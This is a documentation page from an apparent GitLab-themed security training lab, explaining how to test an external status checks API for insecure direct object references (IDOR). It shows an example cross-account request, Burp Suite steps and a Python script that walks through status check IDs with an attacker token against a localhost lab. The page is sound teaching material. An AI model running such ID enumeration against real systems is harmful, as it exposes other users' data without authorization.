<?php require_once 'config.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Testing Techniques - IDOR Documentation</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; color: #e0e0e0; }
        .header { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(252, 109, 38, 0.3); padding: 1rem 2rem; position: sticky; top: 0; z-index: 100; }
        .header-content { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
        .logo { display: flex; align-items: center; gap: 0.75rem; font-size: 1.3rem; font-weight: bold; color: #fc6d26; text-decoration: none; }
        .logo svg { width: 32px; height: 32px; }
        .nav-links { display: flex; gap: 1.5rem; align-items: center; }
        .nav-links a { color: #e0e0e0; text-decoration: none; }
        .nav-links a:hover { color: #fc6d26; }
        .layout { display: flex; max-width: 1400px; margin: 0 auto; }
        .sidebar { width: 280px; min-height: calc(100vh - 60px); background: rgba(0, 0, 0, 0.3); border-right: 1px solid rgba(252, 109, 38, 0.2); padding: 1.5rem; position: sticky; top: 60px; height: calc(100vh - 60px); overflow-y: auto; }
        .sidebar h3 { color: #fc6d26; font-size: 0.85rem; text-transform: uppercase; margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid rgba(252, 109, 38, 0.3); }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 0.25rem; }
        .sidebar-nav a { display: block; padding: 0.6rem 1rem; color: #aaa; text-decoration: none; border-radius: 8px; transition: all 0.3s; font-size: 0.9rem; }
        .sidebar-nav a:hover { background: rgba(252, 109, 38, 0.1); color: #fc6d26; }
        .sidebar-nav a.active { background: rgba(252, 109, 38, 0.2); color: #fc6d26; font-weight: 500; }
        .sidebar-nav .section-title { color: #666; font-size: 0.75rem; text-transform: uppercase; padding: 1rem 1rem 0.5rem; margin-top: 0.5rem; }
        .content { flex: 1; padding: 2rem 3rem; max-width: 900px; }
        .content h1 { color: #fc6d26; font-size: 2rem; margin-bottom: 0.5rem; }
        .content h2 { color: #fc6d26; font-size: 1.5rem; margin: 2rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid rgba(252, 109, 38, 0.3); }
        .content h3 { color: #e0e0e0; font-size: 1.2rem; margin: 1.5rem 0 0.75rem; }
        .content p { color: #aaa; line-height: 1.8; margin-bottom: 1rem; }
        .content ul, .content ol { color: #aaa; line-height: 1.8; margin-bottom: 1rem; padding-left: 1.5rem; }
        .content li { margin-bottom: 0.5rem; }
        .content code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.4rem; border-radius: 4px; color: #88ff88; font-family: 'Consolas', monospace; font-size: 0.9em; }
        .code-block { background: #0d0d0d; border: 1px solid #333; border-radius: 10px; padding: 1.25rem; font-family: 'Consolas', monospace; font-size: 0.85rem; color: #88ff88; overflow-x: auto; margin: 1rem 0; line-height: 1.6; }
        .code-block .comment { color: #666; }
        .code-block .highlight { color: #fc6d26; }
        .info-box { border-radius: 10px; padding: 1rem 1.25rem; margin: 1rem 0; }
        .info-box.info { background: rgba(252, 109, 38, 0.1); border: 1px solid rgba(252, 109, 38, 0.3); }
        .info-box.warning { background: rgba(255, 170, 0, 0.1); border: 1px solid rgba(255, 170, 0, 0.3); }
        .info-box h4 { margin-bottom: 0.5rem; }
        .info-box.info h4 { color: #fc6d26; }
        .info-box.warning h4 { color: #ffaa00; }
        .info-box p { margin-bottom: 0; }
        .nav-buttons { display: flex; justify-content: space-between; margin-top: 3rem; padding-top: 1.5rem; border-top: 1px solid rgba(255, 255, 255, 0.1); }
        .nav-btn { padding: 0.75rem 1.5rem; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(252, 109, 38, 0.3); border-radius: 8px; color: #ccc; text-decoration: none; transition: all 0.3s; }
        .nav-btn:hover { background: rgba(252, 109, 38, 0.2); color: #fc6d26; }
        .tool-card { background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(252, 109, 38, 0.2); border-radius: 12px; padding: 1.5rem; margin: 1rem 0; }
        .tool-card h3 { color: #fc6d26; margin-bottom: 0.75rem; }
        @media (max-width: 900px) { .sidebar { display: none; } .content { padding: 1.5rem; } }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">
                <svg viewBox="0 0 32 32" fill="none">
                    <path d="M16 2L2 12l14 18 14-18L16 2z" fill="#fc6d26"/>
                    <path d="M16 2L2 12h28L16 2z" fill="#e24329"/>
                    <path d="M16 30L2 12l4.5 18H16z" fill="#fca326"/>
                    <path d="M16 30l14-18-4.5 18H16z" fill="#fca326"/>
                </svg>
                GitLab
            </a>
            <nav class="nav-links">
                <a href="index.php">Lab Home</a>
                <a href="login.php">Login</a>
                <a href="../index.php">All Labs</a>
            </nav>
        </div>
    </header>

    <div class="layout">
        <aside class="sidebar">
            <h3>📚 Documentation</h3>
            <ul class="sidebar-nav">
                <li><a href="docs.php">Overview</a></li>
                <li class="section-title">Understanding</li>
                <li><a href="docs-vulnerability.php">The Vulnerability</a></li>
                <li><a href="docs-exploitation.php">Exploitation Guide</a></li>
                <li class="section-title">Defense</li>
                <li><a href="docs-prevention.php">Prevention</a></li>
                <li><a href="docs-testing.php" class="active">Testing Techniques</a></li>
                <li class="section-title">Resources</li>
                <li><a href="docs-references.php">References</a></li>
            </ul>
        </aside>

        <main class="content">
            <h1>Testing Techniques</h1>
            <p>Learn how to test for IDOR vulnerabilities in APIs and web applications.</p>

            <h2>Manual Testing Methodology</h2>

            <h3>1. Identify All Parameters</h3>
            <p>Start by mapping all user-controllable parameters that reference objects:</p>
            <ul>
                <li>URL path parameters: <code>/api/projects/{id}/status_checks/{id}</code></li>
                <li>Query parameters: <code>?status_check_id=123</code></li>
                <li>POST body parameters: <code>{"external_status_check_id": 123}</code></li>
                <li>Headers: <code>X-Project-ID: 123</code></li>
            </ul>

            <h3>2. Understand Object Relationships</h3>
            <p>Map out how objects relate to each other and to users:</p>
            <div class="code-block">
<span class="comment">// Object hierarchy for this lab:</span>
User
├── Projects (owned)
│   ├── Merge Requests
│   │   └── Status Check Responses
│   ├── External Status Checks  <span class="highlight">← Target</span>
│   └── Protected Branches
└── Personal Access Tokens
            </div>

            <h3>3. Create Test Accounts</h3>
            <p>Set up multiple accounts with different permission levels:</p>
            <ul>
                <li><strong>Account A:</strong> Has access to Project 1 with Status Check 1</li>
                <li><strong>Account B:</strong> Has access to Project 2 with Status Check 2</li>
                <li><strong>Account C:</strong> No project access (baseline)</li>
            </ul>

            <h3>4. Test Cross-Account Access</h3>
            <p>Using Account B, try to access Account A's resources:</p>
            <div class="code-block">
<span class="comment"># Logged in as Account B</span>
<span class="comment"># Using Account B's project_id but Account A's status_check_id</span>

POST /api/status_check_responses.php
Authorization: Bearer <span class="highlight">[Account B's token]</span>
project_id=<span class="highlight">2</span>  <span class="comment"># Account B's project</span>
external_status_check_id=<span class="highlight">1</span>  <span class="comment"># Account A's status check!</span>

<span class="comment"># If this returns Account A's data, IDOR exists!</span>
            </div>

            <h2>Automated Testing</h2>

            <div class="tool-card">
                <h3>🔧 Burp Suite Intruder</h3>
                <p>Use Burp Suite to automate ID enumeration:</p>
                <ol>
                    <li>Capture a valid request in Proxy</li>
                    <li>Send to Intruder</li>
                    <li>Mark the object ID as payload position</li>
                    <li>Use Numbers payload (1-1000)</li>
                    <li>Look for different response lengths or status codes</li>
                </ol>
            </div>

            <div class="tool-card">
                <h3>🔧 Autorize Extension</h3>
                <p>Burp extension for automated authorization testing:</p>
                <ul>
                    <li>Configure two sessions (low-priv and high-priv)</li>
                    <li>Browse as high-priv user</li>
                    <li>Autorize automatically replays requests with low-priv session</li>
                    <li>Highlights authorization bypass issues</li>
                </ul>
            </div>

            <h3>Custom Python Script</h3>
            <p>Automate IDOR testing with a script:</p>
            <div class="code-block">
import requests

<span class="comment"># Configuration</span>
BASE_URL = "http://localhost/AC/lab17/api"
ATTACKER_TOKEN = "glpat-attacker-token"
ATTACKER_PROJECT = 3

<span class="comment"># Test range of status check IDs</span>
for status_check_id in range(1, 20):
    response = requests.post(
        f"{BASE_URL}/status_check_responses.php",
        headers={"Authorization": f"Bearer {ATTACKER_TOKEN}"},
        data={
            "project_id": ATTACKER_PROJECT,
            "merge_request_iid": 1,
            "sha": "abc123",
            "external_status_check_id": status_check_id
        }
    )
    
    if response.status_code == 200:
        data = response.json()
        <span class="comment"># Check if we accessed a different project</span>
        if data.get("project", {}).get("id") != ATTACKER_PROJECT:
            print(f"<span class="highlight">[IDOR FOUND]</span> Status Check {status_check_id}")
            print(f"  Project: {data['project']['name']}")
            print(f"  Visibility: {data['project']['visibility']}")
            </div>

            <h2>What to Look For</h2>
            
            <div class="info-box info">
                <h4>🔍 Signs of IDOR Vulnerability</h4>
                <ul style="margin-top: 0.5rem;">
                    <li>Successfully accessing resources owned by other users</li>
                    <li>Response data shows different project/user IDs than expected</li>
                    <li>No 403 Forbidden when accessing unauthorized resources</li>
                    <li>Consistent responses regardless of which project you specify</li>
                    <li>Generic error messages that reveal resource existence</li>
                </ul>
            </div>

            <h2>Testing Checklist</h2>
            <ol>
                <li>□ Identify all object reference parameters</li>
                <li>□ Map object relationships and access controls</li>
                <li>□ Test horizontal access (same privilege, different user)</li>
                <li>□ Test vertical access (different privilege levels)</li>
                <li>□ Test with encoded/obfuscated IDs</li>
                <li>□ Test bulk operations for mass assignment</li>
                <li>□ Test deletion and modification endpoints</li>
                <li>□ Verify error messages don't leak information</li>
            </ol>

            <div class="info-box warning">
                <h4>⚠️ Testing Safely</h4>
                <p>
                    Always test in controlled environments with permission. In production, 
                    use your own test accounts and resources. Never access actual user data 
                    without explicit authorization.
                </p>
            </div>

            <div class="nav-buttons">
                <a href="docs-prevention.php" class="nav-btn">← Prevention</a>
                <a href="docs-references.php" class="nav-btn">Next: References →</a>
            </div>
        </main>
    </div>
</body>
</html>
